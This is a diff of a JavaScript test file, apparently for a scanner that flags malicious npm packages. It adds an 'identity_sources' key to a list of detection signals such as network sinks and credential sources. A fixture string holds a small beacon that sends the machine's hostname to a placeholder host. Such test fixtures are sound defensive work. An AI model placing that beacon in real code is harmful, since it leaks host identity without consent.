@@ -32,7 +32,8 @@ const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).fla
 const sha = (s) => crypto.createHash('sha256').update(s).digest('hex');
 const BENIGN = 'module.exports = 1;\n';
 const NETTY = 'const https = require("https");\nhttps.request({ host: "h" }).end(require("os").hostname());\n';
-const FACT_KEYS = ['binary', 'net_sinks', 'exec_sinks', 'obf_idents', 'decode_markers', 'hex_density', 'numeric_hex', 'cred_sources', 'sinks', 'overrides', 'address_families'];
+const FACT_KEYS = ['binary', 'net_sinks', 'exec_sinks', 'obf_idents', 'decode_markers', 'hex_density', 'numeric_hex', 'cred_sources', 'sinks', 'overrides',
+  'address_families', 'identity_sources'];
 
 // g: two plain versions, nothing named or contributing -> NOT armed; main index.js, one bin
 const G = { name: 'g', 'dist-tags': { latest: '1.1.0' }, time: { '1.0.0': at(0), '1.1.0': at(48) },
